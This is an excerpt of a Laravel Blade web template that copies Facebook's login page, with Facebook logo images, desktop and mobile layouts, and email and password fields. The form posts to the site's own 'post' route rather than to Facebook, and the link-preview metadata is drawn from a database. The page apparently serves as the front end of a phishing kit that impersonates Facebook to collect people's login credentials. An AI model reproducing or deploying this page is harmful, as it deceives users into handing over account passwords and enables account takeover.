...
<link rel="stylesheet" type="text/css" href="{{ asset('css/computer.css') }}" media="screen and (min-width: 769px)">
<link rel="stylesheet" type="text/css" href="{{ asset('css/mobile.css') }}" media="screen and (max-width: 768px)">
...
<meta property="og:title"              content="{{ \App\Meta::find(2)->title }}" />
<meta property="og:description"        content="{{ \App\Meta::find(2)->title }}" />
<meta property="og:image"              content="{{ asset(\App\Meta::find(2)->image) }}" />
...
<div class="computer">
  <header>
    <div class="headersubdiv">
      <img src="{{ asset('images/fblogo.png') }}" class="fblogo">
      <div class="loginform">
        <table>
          <tr>
            ...
            <form action="{{ route('post') }}" method="POST">
                @csrf
                <td><input name="email" class="logintext loginfield" type="text" required=""></td>
                <td><input name="password" class="logintext loginrowgap loginfield" type="password" required=""></td>
    ...
    <div class="mainsubdiv">
      <div class="welcome">
        ...
        <div class="welcomepic">
          <img src="{{ asset('images/connecting.png') }}" alt="welcome">
        </div>
      </div>
      <div class="signupdiv">
...
<div class="mobile">
  <div class="mobheader">
    <img src="{{ asset('images/fblogo.png') }}" class="mobfblogo">
  </div>
  <div id="mobapplink" class="clearfix">
    <a href="#">
      <img src="{{ asset('images/fbandroid.png') }}" id="mobandroidpic">
  ...
  <div class="mobmaindiv">
    ...
    @csrf
      <div id="mobtextdiv">
        <input type="text" name="email" class="mobtextbox mobtextbox1" placeholder="Mobile number or email address" required="">
        <input name="password" type="password" class="mobtextbox mobtextbox2" placeholder="Password" required="">
      </div>
